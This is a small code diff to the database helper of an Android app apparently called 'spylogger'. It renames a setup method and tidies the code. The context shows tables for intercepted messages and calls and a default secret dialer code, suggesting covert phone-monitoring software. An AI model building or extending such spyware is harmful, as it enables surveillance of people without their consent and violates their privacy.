@@ -26,9 +26,8 @@ public class DatabaseHelper extends OrmLiteSqliteOpenHelper {
 	 * Suggested Copy/Paste code. Everything from here to the done block.
 	 ************************************************/
 
-	public  static final String DATABASE_NAME = "spylogger.db";
+	public static final String DATABASE_NAME = "spylogger.db";
 	private static final int DATABASE_VERSION = 1;
-
 
 	public DatabaseHelper(Context context) {
 		super(context, DATABASE_NAME, null, DATABASE_VERSION, R.raw.ormlite_config);
@@ -46,7 +45,7 @@ public class DatabaseHelper extends OrmLiteSqliteOpenHelper {
 			TableUtils.createTableIfNotExists(connectionSource, Mensagem.class);
 			TableUtils.createTableIfNotExists(connectionSource, Ligacao.class);
 
-			createDefault();
+			criarConfiguracaoPadrao();
 		} catch (SQLException e) {
 			Log.e(DatabaseHelper.class.getName(), "Unable to create datbases", e);
 		}
@@ -58,7 +57,7 @@ public class DatabaseHelper extends OrmLiteSqliteOpenHelper {
 	}
 
 
-	private void createDefault(){
+	public void criarConfiguracaoPadrao(){
 		Configuracao configuracao=new Configuracao();
 		configuracao.setDialer("90123");
 		configuracao.setFacebook(true);
@@ -69,6 +68,7 @@ public class DatabaseHelper extends OrmLiteSqliteOpenHelper {
 		try {
 			getDao(Configuracao.class).create(configuracao);
 		} catch (SQLException e) {
+			e.printStackTrace();
 			logger.error("SPYLOGGER: "+e.getMessage());
 		}
 	}
